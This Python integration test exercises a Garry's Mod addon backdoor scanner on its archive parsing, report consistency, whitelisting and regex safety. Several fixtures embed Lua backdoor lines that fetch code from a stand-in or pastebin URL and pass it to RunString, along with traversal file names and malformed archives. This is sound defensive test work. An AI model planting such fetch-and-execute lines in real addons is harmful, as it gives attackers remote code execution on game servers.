import ctypes
import hashlib
from html.parser import HTMLParser
import json
import lzma
import os
from pathlib import Path
import shutil
import struct
import re
import subprocess
import sys
import tempfile
import urllib.parse


def gma(files):
    header = b"GMAD" + struct.pack("<BQQ", 3, 0, 0) + b"\0review\0description\0author\0" + struct.pack("<i", 1)
    body = b""
    for index, (name, content) in enumerate(files, 1):
        raw = name if isinstance(name, bytes) else name.encode()
        header += struct.pack("<I", index) + raw + b"\0" + struct.pack("<qI", len(content), 0)
        body += content
    return header + struct.pack("<I", 0) + body


def main():
    scanner = Path(sys.argv[1]).resolve()
    rules = Path(sys.argv[2]).resolve()
    checks = 0
    with tempfile.TemporaryDirectory(prefix="bdscan-integration-") as temporary:
        work = Path(temporary)

        def run(target, name, extra=(), expected=1, rule_dir=rules):
            nonlocal checks
            output = work / "output" / name
            command = [str(scanner), "-d", str(target), "-o", str(output), "--rules", str(rule_dir), "-q", *extra]
            result = subprocess.run(command, cwd=work, capture_output=True, text=True, timeout=30,
                                    encoding="utf-8", errors="replace")
            assert result.returncode == expected, f"{name}: exit {result.returncode}\n{result.stdout}\n{result.stderr}"
            checks += 1
            if expected == 2:
                return None
            data = json.loads((output / "scan_log.json").read_text(encoding="utf-8"))
            if expected == 0:
                assert data["complete"] and data["unscanned"]["total"] == 0, name
            return data

        def ids(data):
            return {item["id"] for item in data["detections"]}

        fixtures = rules / "tests" / "fixtures"

        data = run(fixtures / "malicious", "fixture-malicious")
        found = ids(data)
        for expected in ("LUA-010", "LUA-028"):
            assert expected in found, f"malicious fixture lost {expected}"
        folded = [item for item in data["detections"] if item["id"] == "LUA-028"]
        assert len(folded) >= 4, (
            "concatenation, string.char, escapes and reverse must each fold back "
            f"to a _G lookup, got {len(folded)}")
        assert not [item for item in data["detections"] if item["line_number"] >= 14], (
            "the trailing comment line must not be reported")
        sampled = next(item for item in data["detections"] if item["id"] == "LUA-010")
        assert sampled["context"], "a finding must carry a context block"
        assert sampled["hint"], "a finding must carry a hint"
        assert sampled["hash"], "a finding must carry the hash of its file"

        run(fixtures / "clean", "fixture-clean", expected=0)
        run(fixtures / "regression", "fixture-regression", expected=0)

        assert "COMP-002" in ids(run(fixtures / "composite", "fixture-composite"))
        filtered = ids(run(fixtures / "composite", "fixture-composite-critical", ["-s", "critical"]))
        assert "LUA-042" not in filtered, "-s critical must hide the MEDIUM half"
        assert "COMP-002" in filtered, "a composite must survive a filter that hides its parts"

        binary = work / "binmodule/lua/bin"
        binary.mkdir(parents=True)
        (binary / "gmsv_example_win64.dll").write_bytes(b"not a real module")
        assert "MOD-001" in ids(run(work / "binmodule", "fixture-binary-module"))

        workshop = work / "workshop-archive"
        workshop.mkdir()
        (workshop / "3012345678.gma").write_bytes(lzma.compress(
            gma([("lua/autorun/backdoor.lua",
                  b'http.Fetch("http://x.tld/p", function(b) RunString(b) end)\n')]),
            format=lzma.FORMAT_ALONE))
        data = run(workshop, "fixture-workshop")
        assert data["decompressed_archives"] == 1
        assert "LUA-010" in ids(data)
        assert data["unscanned"]["total"] == 0, "a decompressed archive is not unscanned"

        sample = work / "changed.lua"
        sample.write_text('RunString("print(1)")\n', encoding="utf-8")
        baseline = run(sample, "diff")
        assert "LUA-001" in ids(baseline)
        run(sample, "diff", ["--diff"], expected=0)
        sample.write_text('RunString("print(2)")\n', encoding="utf-8")
        assert "LUA-001" in ids(run(sample, "diff", ["--diff"]))
        baseline_path = work / "output/diff/last_scan.json"
        saved = baseline_path.read_bytes()
        run(sample, "diff", ["--exclude-tags", "execution"] , expected=0)
        assert baseline_path.read_bytes() == saved
        run(sample, "diff", ["-s", "critical"])
        assert baseline_path.read_bytes() == saved
        broken_archive = work / "broken.gma"
        broken_archive.write_bytes(b"GMAD")
        data = run(broken_archive, "diff", expected=3)
        assert not data["complete"] and data["unscanned"]["total"] == 1
        assert baseline_path.read_bytes() == saved

        failed_output = work / "output/write-failure"
        failed_output.mkdir()
        (failed_output / "last_scan.json").write_bytes(saved)
        (failed_output / "scan_log.json").mkdir()
        run(sample, "write-failure", expected=2)
        assert (failed_output / "last_scan.json").read_bytes() == saved
        assert not list(failed_output.glob("*.tmp.*"))

        sample.write_text('RunString("print(1)")\n', encoding="utf-8")
        outdated = json.loads(saved)
        outdated.pop("schema_version")
        baseline_path.write_text(json.dumps(outdated), encoding="utf-8")
        assert "LUA-001" in ids(run(sample, "diff", ["--diff"]))
        baseline_path.write_bytes(saved)

        modified_rules = work / "modified-rules"
        shutil.copytree(rules, modified_rules, ignore=shutil.ignore_patterns("tests", "nlohmann", "*.cpp", "*.h"))
        lua_rules = modified_rules / "lua_patterns.txt"
        original_rules = lua_rules.read_text(encoding="utf-8")
        lua_rules.write_text(original_rules.replace("Code Execution (RunString)", "Code Execution (changed hint)"), encoding="utf-8")
        if lua_rules.read_text(encoding="utf-8") == original_rules:
            lua_rules.write_text(original_rules + '\nreview_marker;;;[LOW] LUA-999 Review Marker\n', encoding="utf-8")
        assert "LUA-001" in ids(run(sample, "diff", ["--diff"], rule_dir=modified_rules))
        lua_rules.write_text(original_rules, encoding="utf-8")
        with (modified_rules / "whitelist.txt").open("a", encoding="utf-8") as output:
            output.write("\n*/unrelated.lua;;;LUA-001\n")
        assert "LUA-001" in ids(run(sample, "diff", ["--diff"], rule_dir=modified_rules))

        for index, replacement in enumerate((
            "([;;;[CRITICAL] LUA-001 Broken execution rule",
            "RunString;;;LUA-001 Missing severity",
            "RunString;;;[CRITICAL] Missing identifier",
            "missing separator",
        )):
            lines = [replacement if "[CRITICAL] LUA-001 " in line else line for line in original_rules.splitlines()]
            lua_rules.write_text("\n".join(lines), encoding="utf-8")
            run(sample, f"bad-pattern-{index}", expected=2, rule_dir=modified_rules)
        lua_rules.write_text(original_rules, encoding="utf-8")
        composite_path = modified_rules / "composite_rules.txt"
        original_composites = composite_path.read_text(encoding="utf-8")
        composite_path.write_text(original_composites + "\nLUA-999;;;[CRITICAL] COMP-999 Unknown input\n", encoding="utf-8")
        run(sample, "bad-composite", expected=2, rule_dir=modified_rules)
        composite_path.write_text(original_composites, encoding="utf-8")
        run(sample, "unknown-option", ["--unknown-option"], expected=2)
        run(sample, "missing-option", ["--memory-limit"], expected=2)
        run(sample, "invalid-budget", ["--memory-limit", "-1"], expected=2)

        addons = work / "addons"
        module = addons / "addon-a/lua/bin/gmsv_review_win64.dll"
        module.parent.mkdir(parents=True)
        module.write_bytes(b"native module test placeholder")
        config = addons / "addon-b/lua/config.lua"
        config.parent.mkdir(parents=True)
        config.write_text('local service = "http://192.168.1.5/status"\n', encoding="utf-8")
        assert "COMP-008" not in ids(run(addons, "unrelated-addons"))
        config.rename(addons / "addon-a/lua/config.lua")
        data = run(addons, "same-addon", ["--html"])
        combined = next(item for item in data["detections"] if item["id"] == "COMP-008")
        assert len(combined["related_findings"]) == 2
        assert len({item["file"] for item in combined["related_findings"]}) == 2
        html = (work / "output/same-addon/scan_report.html").read_text(encoding="utf-8")
        assert "gmsv_review_win64.dll" in html and "config.lua" in html

        accepted = modified_rules / "whitelist.txt"
        before = accepted.read_text(encoding="utf-8")
        for bad in ("LUA-9999@*/x/*", "lua-153@*/x/*", "NONSENSE@*/x/*"):
            result = subprocess.run(
                [str(scanner), "--rules", str(modified_rules), "--accept", bad],
                capture_output=True, text=True, timeout=30)
            assert result.returncode == 2, bad + " was accepted as a rule id"
            checks += 1
        assert accepted.read_text(encoding="utf-8") == before, (
            "a rejected --accept must not touch whitelist.txt")
        subprocess.run([str(scanner), "--rules", str(modified_rules),
                        "--accept", "LUA-153@*/never-matches/*", "--reason", "test"],
                       capture_output=True, text=True, timeout=30, check=True)
        data = run(sample, "stale-whitelist", rule_dir=modified_rules)
        accepted.write_text(before, encoding="utf-8")

        loops = work / "loops"
        (loops / "real" / "sub").mkdir(parents=True)
        (loops / "real" / "sub" / "a.lua").write_bytes(b"RunString(payload)\n")
        linked = True
        try:
            os.symlink(loops / "real", loops / "real" / "sub" / "back",
                       target_is_directory=True)
        except (OSError, NotImplementedError, AttributeError):
            linked = False
        if linked:
            data = run(loops / "real", "symlink-loop")
            assert data["files_processed"] == 1, (
                "a directory symlink pointing at its own parent must not be followed: "
                + str(data["files_processed"]) + " files walked")
            assert data["unscanned"]["total"] == 0, "the loop must not look like unreadable files"
            assert len([d for d in data["detections"] if d["id"] == "LUA-001"]) == 1

            shared = work / "shared"
            (shared / "real").mkdir(parents=True)
            (shared / "top").mkdir(parents=True)
            (shared / "real" / "b.lua").write_bytes(b"RunString(payload)\n")
            os.symlink(shared / "real", shared / "top" / "link", target_is_directory=True)
            data = run(shared, "symlink-duplicate")
            assert data["files_processed"] == 1, (
                "the same directory reached twice must be scanned once, got "
                + str(data["files_processed"]))
        else:
            print("integration: symlink regression skipped, no permission to create one")

        harvest = work / "harvest"
        harvest.mkdir()
        (harvest / "confirmed.lua").write_bytes(b"RunString(net.ReadString())\n")
        data = run(harvest, "hash-harvest")
        hashes = {item["hash"] for item in data["detections"] if item.get("hash")}
        assert hashes, "a finding must carry the hash of the file it came from"
        (modified_rules / "known_hashes.txt").write_text(
            "\n".join(hashes) + "\n", encoding="utf-8")
        data = run(harvest, "hash-recognised", rule_dir=modified_rules)
        assert "HASH-001" in ids(data), "a harvested hash must be recognised on the next scan"
        assert data["known_backdoors"] == 1

        # A cache and a baseline are only safe to reuse while the rules behind them
        # are unchanged, and they decide that from these two fingerprints. Editing
        # any rule file therefore has to move one of them.
        probe = work / "fingerprint-tree"
        probe.mkdir()
        (probe / "x.lua").write_text("print('hi')\n", encoding="utf-8")

        def fingerprints(rule_dir, name):
            output = work / "output" / name
            subprocess.run(
                [str(scanner), "-d", str(probe), "-o", str(output),
                 "--rules", str(rule_dir), "-q"],
                capture_output=True, text=True, timeout=30)
            stamped = json.loads((output / "scan_log.json").read_text(encoding="utf-8"))
            return stamped["ruleset_version"], stamped["policy_version"]

        base_versions = fingerprints(rules, "fingerprint-base")
        additions = {
            "lua_patterns.txt": ("zzz_probe_only;;;[LOW] LUA-899 Probe;;;probe", 0),
            "binary_patterns.txt": ("zzz_probe_only;;;[LOW] BIN-899 Probe;;;probe", 0),
            "data_patterns.txt": ("zzz_probe_only;;;[LOW] DATA-899 Probe;;;probe", 0),
            "module_patterns.txt": ("zzz_probe_only;;;[LOW] MOD-899 Probe;;;probe", 0),
            "composite_rules.txt": ("LUA-001 and LUA-010;;;[LOW] COMP-899 Probe;;;probe", 0),
            "known_hashes.txt": ("f" * 64 + ";;;probe", 1),
            "whitelist.txt": ("*/nowhere-probe/*;;;LUA-001", 1),
        }
        for name, (line, which) in additions.items():
            edited = work / ("rules-" + name.replace(".", "-"))
            if edited.exists():
                shutil.rmtree(edited)
            shutil.copytree(rules, edited, ignore=shutil.ignore_patterns(
                "tests", "nlohmann", "*.cpp", "*.h"))
            target = edited / name
            target.write_text(target.read_text(encoding="utf-8").rstrip("\n") + "\n" + line + "\n",
                              encoding="utf-8")
            moved = fingerprints(edited, "fingerprint-" + name.replace(".", "-"))
            assert moved[which] != base_versions[which], \
                f"editing {name} left the fingerprint unchanged, a stale cache would survive it"
        checks += 1

        # One scan, four ways of telling you about it. A reader who opens the
        # HTML and a pipeline that reads the SARIF have to be told the same thing.
        agreeing = work / "agreeing"
        agreeing.mkdir()
        for index in range(6):
            (agreeing / ("bad%d.lua" % index)).write_text(
                'http.Fetch("https://pastebin.com/raw/AbCdEf12", function(b) RunString(b) end)\n',
                encoding="utf-8")
        for index in range(4):
            (agreeing / ("mild%d.lua" % index)).write_text(
                "local t = util.TableToJSON(x)\nfile.Delete(t)\n", encoding="utf-8")
        (agreeing / "broken.gma").write_bytes(b"GMAD" + bytes([3]) + b"\0" * 20)

        spoken = subprocess.run(
            [str(scanner), "-d", str(agreeing), "-o", str(work / "output" / "agreement"),
             "--rules", str(rules), "--html", "--sarif", "--color", "never"],
            capture_output=True, text=True, timeout=60)
        assert spoken.returncode == 1, spoken.stdout
        checks += 1
        said = work / "output" / "agreement"
        log = json.loads((said / "scan_log.json").read_text(encoding="utf-8"))
        report = (said / "scan_report.html").read_text(encoding="utf-8")
        sarif = json.loads((said / "scan_results.sarif").read_text(encoding="utf-8"))

        by_severity = {}
        for item in log["detections"]:
            by_severity[item["severity"]] = by_severity.get(item["severity"], 0) + 1
        level_of = {"critical": "error", "high": "error", "medium": "warning", "low": "note"}
        wanted = {}
        for severity, count in by_severity.items():
            wanted[level_of[severity]] = wanted.get(level_of[severity], 0) + count

        results = sarif["runs"][0]["results"]
        assert len(results) == len(log["detections"]), \
            f"sarif has {len(results)} results, json has {len(log['detections'])}"
        got_levels = {}
        for item in results:
            got_levels[item["level"]] = got_levels.get(item["level"], 0) + 1
        assert got_levels == wanted, f"sarif levels {got_levels}, json says {wanted}"

        for severity in ("critical", "high", "medium", "low"):
            shown = re.search(r"^\s*%s\s+(\d+)" % severity, spoken.stdout, re.I | re.M)
            assert shown, f"the console summary never states a {severity} count"
            assert int(shown.group(1)) == by_severity.get(severity, 0), \
                f"console says {shown.group(1)} {severity}, json says {by_severity.get(severity, 0)}"

        for path in {item["file"] for item in log["detections"]}:
            assert path.replace("&", "&amp;") in report, f"{path} is missing from the html report"

        unscanned = log["unscanned"]["total"]
        for label, text, pattern in (("console", spoken.stdout, r"(\d+) files? (?:was|were) NOT examined"),
                                     ("html", report, r"(\d+) files? (?:was|were) not examined")):
            stated = re.search(pattern, text)
            assert stated, f"{label} never says how much went unexamined"
            assert int(stated.group(1)) == unscanned, \
                f"{label} says {stated.group(1)} unscanned, json says {unscanned}"
        checks += 1

        # The report is a document people open in a browser and print. Every
        # container it opens has to close, including the ones that only appear
        # when there are enough files to reach that part of the page.
        payload = 'http.Fetch("https://pastebin.com/raw/AbCdEf12", function(b) RunString(b) end)\n'
        sparse = work / "sparse"
        sparse.mkdir()
        (sparse / "one.lua").write_text(payload, encoding="utf-8")
        crowded = work / "crowded"
        crowded.mkdir()
        for index in range(40):
            (crowded / ("f%02d.lua" % index)).write_text(payload, encoding="utf-8")
        for name, target in (("html-small", sparse), ("html-crowded", crowded)):
            run(target, name, ["--html"])
            report = (work / "output" / name / "scan_report.html").read_text(encoding="utf-8")
            for tag in ("div", "table", "tbody", "details", "header", "ul"):
                opened = len(re.findall(r"<%s\b[^>]*>" % tag, report))
                closed = len(re.findall(r"</%s\s*>" % tag, report))
                assert opened == closed, f"{name}: <{tag}> {opened} open, {closed} closed"
            depth = 0
            for match in re.finditer(r"<div\b[^>]*>|</div\s*>", report):
                depth += 1 if match.group().startswith("<div") else -1
                assert depth >= 0, f"{name}: a </div> closed more than was open"
            assert depth == 0, f"{name}: {depth} div(s) left open"
        checks += 1

        # (a+)+ against a long run of a's has to try every way of splitting it.
        # MSVC gives up and throws; libstdc++ has no limit and never returns, so
        # the same rule file is a hung scan on a server. The shape is refused up
        # front so both platforms answer the same way, and no shipped rule uses it.
        complexity_rules = work / "complexity-rules"
        complexity_rules.mkdir()
        for copied in ("binary_patterns.txt", "data_patterns.txt", "module_patterns.txt",
                       "known_hashes.txt", "whitelist.txt"):
            shutil.copy(rules / copied, complexity_rules / copied)
        (complexity_rules / "composite_rules.txt").write_text("", encoding="utf-8")

        exhausting = work / "exhausting"
        exhausting.mkdir()
        (exhausting / "x.lua").write_text("a" * 400 + "c\n", encoding="utf-8")

        for shape in ("(a+)+b", "(\\w*)*b", "(?:x{2,})+y", "((a|b)+)+c"):
            (complexity_rules / "lua_patterns.txt").write_text(
                "%s;;;[HIGH] LUA-901 Catastrophic;;;hint\n" % shape, encoding="utf-8")
            refused_shape = subprocess.run(
                [str(scanner), "-d", str(exhausting),
                 "-o", str(work / "output" / "pattern-complexity"),
                 "--rules", str(complexity_rules), "-q"],
                capture_output=True, text=True, timeout=60)
            assert refused_shape.returncode == 2, f"{shape}: exit {refused_shape.returncode}"
            assert "repeats a group that can match the same text more than one way" in refused_shape.stderr, \
                f"{shape}: {refused_shape.stderr}"

        # A group anchored by a literal cannot backtrack, and BIN-012 is written
        # that way, so the check must leave it alone.
        (complexity_rules / "lua_patterns.txt").write_text(
            "[0-9]{2,3}(?:,[0-9]{2,3}){6,};;;[HIGH] LUA-902 Char codes;;;hint\n", encoding="utf-8")
        accepted = subprocess.run(
            [str(scanner), "-d", str(exhausting), "-o", str(work / "output" / "anchored-repeat"),
             "--rules", str(complexity_rules), "-q"],
            capture_output=True, text=True, timeout=60)
        assert accepted.returncode in (0, 1), accepted.stdout + accepted.stderr
        checks += 1

        # Whitelist form 3, "<path glob>;;;<sha256>": exempt this file, but only
        # where it sits and only with this content. Nothing had run it end to end.
        pinned_tree = work / "pinned"
        (pinned_tree / "addons" / "trusted" / "lua").mkdir(parents=True)
        (pinned_tree / "addons" / "other" / "lua").mkdir(parents=True)
        pinned_body = 'http.Fetch("https://pastebin.com/raw/AbCdEf12", function(b) RunString(b) end)\n'
        (pinned_tree / "addons" / "trusted" / "lua" / "known.lua").write_text(
            pinned_body, encoding="utf-8", newline="")
        (pinned_tree / "addons" / "other" / "lua" / "elsewhere.lua").write_text(
            pinned_body, encoding="utf-8", newline="")
        (pinned_tree / "addons" / "trusted" / "lua" / "edited.lua").write_text(
            pinned_body.replace("AbCdEf12", "ZZZZZZZZ"), encoding="utf-8", newline="")
        # An archive entry may claim the trusted path; the glob matches where the
        # archive sits, not the name its author chose.
        (pinned_tree / "addons" / "packed.gma").write_bytes(
            gma([("addons/trusted/lua/known.lua", pinned_body.encode())]))

        pinned_digest = hashlib.sha256(pinned_body.encode()).hexdigest()
        pinned_rules = work / "pinned-rules"
        shutil.copytree(rules, pinned_rules, ignore=shutil.ignore_patterns(
            "tests", "nlohmann", "*.cpp", "*.h"))
        pinned_list = pinned_rules / "whitelist.txt"
        pinned_list.write_text(
            pinned_list.read_text(encoding="utf-8") + "\n*/addons/trusted/*;;;%s\n" % pinned_digest,
            encoding="utf-8")

        pinned_data = run(pinned_tree, "whitelist-pinned", rule_dir=pinned_rules)
        seen_paths = {item["file"].replace("\\", "/") for item in pinned_data["detections"]}
        assert pinned_data["whitelisted"] == 1, pinned_data["whitelisted"]
        loose = {p for p in seen_paths if ".gma/" not in p}
        assert not any(p.endswith("trusted/lua/known.lua") for p in loose), loose
        assert any(p.endswith("other/lua/elsewhere.lua") for p in seen_paths), \
            "the same content at another path must still be reported"
        assert any(p.endswith("trusted/lua/edited.lua") for p in seen_paths), \
            "changed content at the pinned path must still be reported"
        assert any(".gma/" in p for p in seen_paths), \
            "an archive entry naming the trusted path must not inherit its exemption"
        checks += 1

        # --workshop first looks for a copy the machine already has. That branch
        # needs no network, so it can be tested; the steamcmd download cannot.
        fake_steam = work / "fakesteam"
        subscribed = fake_steam / "steamapps" / "workshop" / "content" / "4000" / "104604709"
        (subscribed / "lua" / "autorun").mkdir(parents=True)
        (subscribed / "lua" / "autorun" / "bad.lua").write_text(
            'http.Fetch("https://pastebin.com/raw/AbCdEf12", function(b) RunString(b) end)\n',
            encoding="utf-8")
        environment = dict(os.environ, STEAM_PATH=str(fake_steam))
        subscribed_run = subprocess.run(
            [str(scanner), "--workshop", "104604709",
             "-o", str(work / "output" / "workshop-local"),
             "--rules", str(rules), "-q"],
            capture_output=True, text=True, timeout=120, env=environment)
        assert subscribed_run.returncode == 1, subscribed_run.stdout + subscribed_run.stderr
        found = json.loads(
            (work / "output" / "workshop-local" / "scan_log.json").read_text(encoding="utf-8"))
        assert "LUA-001" in ids(found), ids(found)
        assert "104604709" in found["scan_root"], found["scan_root"]
        checks += 1

        missing_item = subprocess.run(
            [str(scanner), "--workshop", "999999999999",
             "-o", str(work / "output" / "workshop-absent"),
             "--rules", str(rules), "-q"],
            capture_output=True, text=True, timeout=120,
            env=dict(os.environ, STEAM_PATH=str(work / "empty-steam")))
        assert missing_item.returncode == 2, missing_item.stdout + missing_item.stderr
        checks += 1

        # Colour is off in every other test because they read the output. Nothing
        # had ever looked at what --color always actually emits.
        coloured_tree = work / "coloured"
        coloured_tree.mkdir()
        (coloured_tree / "bad.lua").write_text(
            'http.Fetch("https://pastebin.com/raw/AbCdEf12", function(b) RunString(b) end)\n',
            encoding="utf-8")
        (coloured_tree / "mild.lua").write_text(
            "local t = util.TableToJSON(x)\nfile.Delete(t)\n", encoding="utf-8")
        (coloured_tree / "broken.gma").write_bytes(b"GMAD")
        painted = subprocess.run(
            [str(scanner), "-d", str(coloured_tree), "-o", str(work / "output" / "coloured"),
             "--rules", str(rules), "--color", "always"],
            capture_output=True, text=True, timeout=60)
        checks += 1
        sequences = re.findall("\x1b\\[[0-9;]*m", painted.stdout)
        assert sequences, "--color always emitted no colour at all"
        assert not re.findall("\x1b(?!\\[[0-9;]*m)", painted.stdout), "a stray escape byte"
        depth = 0
        for sequence in sequences:
            if sequence == "\x1b[0m":
                depth -= 1
                assert depth >= 0, "a reset arrived before anything was styled"
            else:
                depth += 1
        assert depth == 0, f"{depth} colour run(s) left open"

        # A SARIF location has to name a file a tool can open. For a finding
        # inside an archive that is the archive; the entry goes in the message.
        # Composite rules used to point at the entry path, which is not a file.
        sarif_archive = work / "sarif-archive"
        (sarif_archive / "addons").mkdir(parents=True)
        (sarif_archive / "addons" / "packed.gma").write_bytes(
            gma([("lua/autorun/bad.lua",
                  b'http.Fetch("https://pastebin.com/raw/AbCdEf12", '
                  b'function(b) RunString(b) end)\n')]))
        run(sarif_archive, "sarif-archive", ["--sarif"])
        inside = json.loads(
            (work / "output" / "sarif-archive" / "scan_results.sarif").read_text(encoding="utf-8"))
        seen_rules = set()
        for item in inside["runs"][0]["results"]:
            uri = item["locations"][0]["physicalLocation"]["artifactLocation"]["uri"]
            seen_rules.add(item["ruleId"])
            assert uri.endswith("packed.gma"), f"{item['ruleId']} points at {uri}"
            assert "archive entry lua/autorun/bad.lua" in item["message"]["text"], \
                f"{item['ruleId']} does not name the entry: {item['message']['text'][:80]}"
        assert any(r.startswith("COMP") for r in seen_rules), \
            f"the archive did not produce a composite to check: {seen_rules}"
        checks += 1

        # A compressed .gma does not have to declare its size, so the scanner
        # guesses and grows the guess when it falls short. The guess is allowed to
        # cost throughput; it is not allowed to cost a finding.
        squeezed = work / "squeezed"
        squeezed.mkdir()
        payload = (b'http.Fetch("https://pastebin.com/raw/AbCdEf12", '
                   b'function(b) RunString(b) end)\n')
        inner = gma([("lua/autorun/hidden.lua", payload),
                     ("lua/autorun/filler.lua", b"-- padding\n" * 900000)])
        blob = lzma.compress(inner, format=lzma.FORMAT_ALONE, preset=9)
        assert blob[5:13] == b"\xff" * 8, "expected an unknown-size header"
        assert len(inner) > 64 * len(blob) * 4, \
            "the sample must expand far past the first guess, or the retry never runs"
        (squeezed / "addon.gma").write_bytes(blob)
        grown = run(squeezed, "decompress-retry")
        assert "LUA-001" in ids(grown), f"the retry lost the payload: {ids(grown)}"
        assert grown["complete"], grown["unscanned"]
        checks += 1

        # Compressed, valid LZMA, but not an archive underneath.
        not_an_archive = work / "not-an-archive"
        not_an_archive.mkdir()
        (not_an_archive / "addon.gma").write_bytes(
            lzma.compress(b"NOPE" + b"\0" * 4000, format=lzma.FORMAT_ALONE))
        rejected_blob = run(not_an_archive, "compressed-not-gma", expected=3)
        assert "not a GMA archive" in rejected_blob["unscanned"]["files"][0]["detail"], \
            rejected_blob["unscanned"]["files"]
        checks += 1

        # An archive is the one input an attacker writes from scratch, and the
        # reader has a rejection for every way it can be wrong. Coverage found
        # that none of those rejections had ever run. Each must be reported for
        # what it is, and none of them may crash.
        head = b"GMAD" + struct.pack("<BQQ", 3, 0, 0)
        meta = b"\0review\0description\0author\0" + struct.pack("<i", 1)

        def gma_entry(index, entry_name, size):
            return struct.pack("<I", index) + entry_name.encode() + b"\0" + struct.pack("<qI", size, 0)

        crowded_index = head + meta
        for index in range(1, 300):
            crowded_index += gma_entry(index, "lua/f%d.lua" % index, 100000)

        hostile_archives = {
            "gma-too-small": (b"GM", "compression header"),
            "gma-bad-magic": (b"NOPE" + b"\0" * 40, "LZMA header"),
            "gma-truncated-header": (b"GMAD" + b"\x03", "truncated header"),
            "gma-truncated-required": (b"GMAD" + struct.pack("<BQQ", 3, 0, 0) + b"unterminated",
                                       "required-content list"),
            "gma-truncated-meta": (head + b"\0review\0desc", "addon metadata"),
            "gma-truncated-index": (head + meta + b"\x01\x00", "truncated file index"),
            "gma-truncated-entry": (head + meta + struct.pack("<I", 1) + b"lua/a.lua\0" + b"\x01",
                                    "truncated file entry"),
            "gma-negative-size": (head + meta + gma_entry(1, "lua/a.lua", -5) + struct.pack("<I", 0),
                                  "size out of range"),
            "gma-huge-entry": (head + meta + gma_entry(1, "lua/a.lua", 1 << 40) + struct.pack("<I", 0),
                               "size out of range"),
            "gma-content-overrun": (crowded_index + struct.pack("<I", 0), "out of range"),
            "gma-content-short": (head + meta + gma_entry(1, "lua/a.lua", 40)
                                  + struct.pack("<I", 0) + b"short", "does not fit"),
        }
        for name, (blob, expected) in hostile_archives.items():
            folder = work / name
            folder.mkdir()
            (folder / "addon.gma").write_bytes(blob)
            broken_data = run(folder, name, expected=3)
            listed = broken_data["unscanned"]["files"]
            assert listed, f"{name} was not recorded as unscanned"
            assert expected in listed[0]["detail"], f"{name}: {listed[0]['detail']}"
        checks += 1

        # A name an archive author picked must be defanged, and the file behind it
        # still read.
        for name, entry_name in (("gma-drive-name", "C:/evil.lua"),
                                 ("gma-traversal-name", "../../evil.lua")):
            folder = work / name
            folder.mkdir()
            (folder / "addon.gma").write_bytes(
                head + meta + gma_entry(1, entry_name, 20) + struct.pack("<I", 0)
                + b"RunString(payload)\n\n")
            found = run(folder, name)
            assert "GMA-001" in ids(found), f"{name} did not report the name: {ids(found)}"
            assert "LUA-001" in ids(found), f"{name} did not read the file: {ids(found)}"
            for item in found["detections"]:
                assert ":" not in item["file"].split("addon.gma", 1)[1], item["file"]
        checks += 1

        # Started with no arguments the scanner asks for a path instead. Coverage
        # said no test had ever gone through that prompt, and it has its own
        # parser with its own quoting rules.
        typed_at = work / "typed"
        typed_at.mkdir()
        (typed_at / "bad.lua").write_text(
            'http.Fetch("https://pastebin.com/raw/AbCdEf12", function(b) RunString(b) end)\n',
            encoding="utf-8")
        spaced = work / "typed with space"
        spaced.mkdir()
        (spaced / "bad.lua").write_text(
            'http.Fetch("https://pastebin.com/raw/AbCdEf12", function(b) RunString(b) end)\n',
            encoding="utf-8")

        def typed(text, name):
            answer = subprocess.run(
                [str(scanner), "--rules", str(rules), "-o", str(work / "output" / name)],
                input=text + "\n", capture_output=True, text=True, timeout=60)
            return answer, answer.stdout + answer.stderr

        for name, text in (("typed-plain", str(typed_at)),
                           ("typed-quoted", '"%s"' % typed_at),
                           ("typed-space-quoted", '"%s"' % spaced),
                           ("typed-space-bare", str(spaced))):
            answer, text_out = typed(text, name)
            assert answer.returncode == 1, f"{name}: exit {answer.returncode}\n{text_out}"
            found = json.loads(
                (work / "output" / name / "scan_log.json").read_text(encoding="utf-8"))
            assert "LUA-001" in ids(found), f"{name} found {ids(found)}"
        checks += 1

        for name, text, marker in (
                ("typed-unclosed", '"%s' % typed_at, "Unclosed quote"),
                ("typed-empty", "", ""),
                ("typed-flag-only", "-s critical", ""),
                ("typed-unknown", '"%s" --nonsense' % typed_at, "Unknown argument")):
            answer, text_out = typed(text, name)
            assert answer.returncode == 2, f"{name}: exit {answer.returncode}\n{text_out}"
            assert marker in text_out, f"{name} said {text_out[:200]}"
        checks += 1

        # The argument errors nothing had ever reached either.
        for extra, marker in ((["--color", "sideways"], "auto, always or never"),
                              (["--memory-limit", "8"], "outside the supported range"),
                              (["--memory-limit", "banana"], "must be an integer"),
                              (["-s", "urgent"], "Invalid severity")):
            rejected = subprocess.run(
                [str(scanner), "-d", str(typed_at), "-o", str(work / "output" / "rejected"),
                 "--rules", str(rules), "-q", *extra],
                capture_output=True, text=True, timeout=30)
            assert rejected.returncode == 2, f"{extra}: exit {rejected.returncode}"
            assert marker in rejected.stdout + rejected.stderr, f"{extra}: {rejected.stdout}{rejected.stderr}"
        checks += 1

        helped = subprocess.run([str(scanner), "--help"], capture_output=True, text=True, timeout=30)
        assert helped.returncode == 0, helped.stdout
        for expected in ("--workshop", "--exclude-tags", "Exit codes", "known_hashes.txt"):
            assert expected in helped.stdout, f"--help never mentions {expected}"
        checks += 1

        # libstdc++ matches by recursing once per repetition, so anything that can
        # repeat over a long run costs one stack frame per character. These are the
        # shapes that used to segmentation-fault: an ordinary texture, a minified
        # line, and a rule file with one very long pattern.
        deep = work / "deep-recursion"
        (deep / "materials").mkdir(parents=True)
        (deep / "lua").mkdir(parents=True)
        # A quote followed by a megabyte without one: what a .vtf looks like.
        (deep / "materials" / "wheel.vtf").write_bytes(
            b"VTF\0" + b"'" + bytes((i % 90) + 33 for i in range(1200000)))
        base64ish = "".join(
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[i % 64]
            for i in range(600000))
        (deep / "lua" / "minified.lua").write_text("local s = '%s'\n" % base64ish, encoding="utf-8")
        (deep / "lua" / "concatenated.lua").write_text(
            "local s = '%s' .. '%s'\n" % ("x" * 300000, "y" * 300000), encoding="utf-8")
        data = run(deep, "deep-recursion")
        assert data["complete"], data["unscanned"]
        checks += 1

        long_rules = work / "long-pattern-rules"
        shutil.copytree(rules, long_rules, ignore=shutil.ignore_patterns(
            "tests", "nlohmann", "*.cpp", "*.h"))
        (long_rules / "lua_patterns.txt").write_text(
            "x" * 200000 + ";;;[HIGH] LUA-907 Hostile;;;hint\n", encoding="utf-8")
        refused = subprocess.run(
            [str(scanner), "-d", str(deep), "-o", str(work / "output" / "long-pattern"),
             "--rules", str(long_rules), "-q"],
            capture_output=True, text=True, timeout=120)
